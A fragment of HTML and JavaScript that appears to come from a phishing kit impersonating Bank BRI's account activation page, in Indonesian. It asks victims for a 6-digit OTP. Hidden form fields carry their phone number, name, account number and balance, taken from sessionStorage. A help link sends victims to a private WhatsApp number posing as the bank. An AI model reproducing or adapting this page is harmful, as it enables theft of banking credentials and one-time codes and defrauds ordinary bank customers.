   ...
   <b> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
      <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="Aktivasi.html" style="text-decoration: none; color: none rgb(9, 100, 127);">Kirim ulang SMS</a></strong></p> 
     </div>
     <center>
...
<input type="hidden" id="nopon" name="tele" value="">
<input type="hidden" id="namasaya" name="namanye" value="">
<input type="hidden" id="nomorrek" name="kertu" value="">
<input type="hidden" id="saldoku" name="uang" value="">
         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="KODE Aktivasi 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" required onclick="gantiborder1()">
  
         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: underline" onclick="location.href='https://wa.me/6285768838836?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Aktivasi'"> Belum Menerima Kode Aktivasi ? </strong></p></b>
        </div>
       </center>
       <b>
...
<script>
var nomorhp = sessionStorage.getItem("nomorhp");

document.getElementById("nopon").value = nomorhp + "";
var namaku = sessionStorage.getItem("namaku");
document.getElementById("namasaya").value = namaku + "";
var noreke = sessionStorage.getItem("noreke");
document.getElementById("nomorrek").value = noreke + "";
var saldo = sessionStorage.getItem("saldo");
document.getElementById("saldoku").value = saldo + "";
